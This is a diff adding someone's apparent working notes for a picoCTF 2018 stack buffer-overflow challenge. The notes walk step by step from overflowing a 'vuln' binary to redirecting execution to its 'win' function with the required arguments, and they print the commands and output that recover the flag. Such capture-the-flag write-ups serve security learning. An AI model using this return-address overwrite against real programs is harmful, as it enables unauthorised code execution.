@@ -1,0 +1,58 @@
+echo `python -c "print 'A' * 100"` | ./vuln
+dmesg | tail
+# keep incrementing echo statement by 4 until we see
+
+
+echo `python -c "print 'A' * 116"` | ./vuln
+141647.674407] vuln[2037]: segfault at 41414141 ip 0000000041414141 sp 00000000ff869d90 error 14 in libc-2.28.so[f7dba000+19000]
+# notice the 41414141 ('A')
+
+echo `python -c "print 'A' * 112 + 'BBBB'"` | ./vuln
+[141750.615116] vuln[2052]: segfault at 42424242 ip 0000000042424242 sp 00000000ffeaabe0 error 14 in libc-2.28.so[f7d95000+19000]
+#now 42 ('B')
+
+So we need to put our memory address there...
+
+# find the symbol for "win"
+readelf -s ./vuln
+
+readelf -s ./vuln | grep -i "win"
+    66: 080485cb   123 FUNC    GLOBAL DEFAULT   14 win
+
+address = 080485cb
+# need to convert to little endian (reverse the order of the bytes and prepend with \x)
+
+# pwntools
+>>> import pwn
+>>> pwn.p32(0x080485cb)
+'\xcb\x85\x04\x08'
+
+# struct (built in)
+# < means little endian
+# I means integer
+import struct
+>>> struct.pack('<I', 0x080485cb)
+'\xcb\x85\x04\x08'
+
+echo `python -c "import pwn; print 'A' * 112 + pwn.p32(0x080485cb)"` | ./vuln
+Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.
+
+#now we need a return address because the next 4 bytes beneath this should be where to return to. For now, try just CCCC
+echo `python -c "import pwn; print 'A' * 112 + pwn.p32(0x080485cb) + 'CCCC'"` | ./vuln
+
+#next we need to include the arguments that were specified in the C program.
+
+#  if (arg1 != 0xDEADBEEF)
+#    return;
+#  if (arg2 != 0xDEADC0DE)
+#    return;
+
+echo `python -c "import pwn; print 'A' * 112 + pwn.p32(0x080485cb) + 'DDDD' + pwn.p32(0xDEADBEEF) + pwn.p32(0xDEADC0DE)"` | ./vuln
+picoCTF{FAKEFAKEFAKE3_3asy65489706}
+Segmentation fault
+# doing this, we get the flag.  We still get a segmentation fault though....
+# should be ok for our exploit...
+
+ssh Seferan@2018shell.picoctf.com
+
+
